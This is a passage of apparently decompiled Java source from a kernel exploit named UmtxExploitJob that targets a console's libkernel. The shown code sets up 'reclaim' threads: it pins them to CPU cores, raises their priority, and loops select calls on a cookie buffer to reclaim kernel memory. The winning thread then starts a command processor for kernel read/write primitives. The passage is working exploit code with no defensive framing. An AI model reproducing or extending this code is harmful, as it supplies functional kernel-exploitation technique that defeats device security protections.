                if (DebugStatus.isDebugEnabled()) {
                    DebugStatus.debug("[+] kprim[" + this.id + "]: pinning thread to " + this.core);
                }
                final int returnCode = UmtxExploitJob.pinToCoreSelf(this.core, this.libkernel);
                if (returnCode < 0) {
                    DebugStatus.error("[-] kprim[" + this.id + "]: failed to pin thread, returnCode: " + returnCode);
                }
                if (DebugStatus.isNoticeEnabled()) {
                    DebugStatus.notice("[+] kprim[" + this.id + "]: prepared on cpu " + this.libkernel.sceKernelGetCurrentCpu());
                }
            }
            if (this.prio != 0) {
                if (DebugStatus.isNoticeEnabled()) {
                    DebugStatus.notice("[+] " + this.id + ": setting prio " + this.prio);
                }
                final int returnCode = UmtxExploitJob.setRtprioSelf(this.prio, this.libkernel);
                if (returnCode < 0) {
                    DebugStatus.error("[-] " + this.id + ": failed to set prio, returnCode: " + returnCode);
                }
            }
            try {
                final PThread pthreadLib = new PThread(this.libkernel);
                final PThreadNp pthreadNpLib = new PThreadNp(this.libkernel);
                final PThreadType pthread = pthreadLib.self();
                pthreadNpLib.rename(pthread, "reclaim#" + this.id);
                if (DebugStatus.isTraceEnabled()) {
                    DebugStatus.trace("[+] renamed reclaim#" + this.id + " native thread.");
                }
            }
            catch (final SdkException | RuntimeException | Error e) {
                DebugStatus.error("[-] failed to rename the native thread of reclaim#" + this.id);
            }
        }
        
        private void loop() {
            while (!this.exitSignal.get()) {
                if (this.threadData.neoFound.get()) {
                    if (this.threadData.neo.get() != this.id) {
                        if (DebugStatus.isDebugEnabled()) {
                            DebugStatus.debug("[+] kprim[" + this.id + "]: neo found, not me, exiting");
                        }
                        return;
                    }
                    break;
                }
                else {
                    this.cookieBuf.write8(this.cookie);
                    final int returnCode = this.libkernel.select(1, this.cookieBuf, Pointer.NULL, Pointer.NULL, this.timeoutBuf);
                    if (returnCode < 0) {
                        DebugStatus.error("[-] " + this.id + ": failed to select, returnCode: " + returnCode);
                    }
                    if (!this.selectedOnce) {
                        this.selectedOnce = true;
                        this.threadData.selectedOnceCounter.incrementAndGet();
                    }
                    Thread.yield();
                }
            }
            if (DebugStatus.isNoticeEnabled()) {
                DebugStatus.notice("[+] kprim[" + this.id + "]: starting command processor");
            }
            (this.commandProcessor = new CommandProcessor()).handleCommands();
            if (DebugStatus.isNoticeEnabled()) {
                DebugStatus.notice("[+] kprim[" + this.id + "]: finished");
            }
        }
        
        private void cleanup() {
            if (this.cookieBuf != null) {
                this.cookieBuf.free();
            }
            if (this.timeoutBuf != null) {
                this.timeoutBuf.free();
            }
            this.libkernel.closeLibrary();
        }
    }
    
    public static class RWResult
    {
        public int returnCode;
        
        public RWResult(final int returnCode) {
            this.returnCode = returnCode;
        }
    }
}
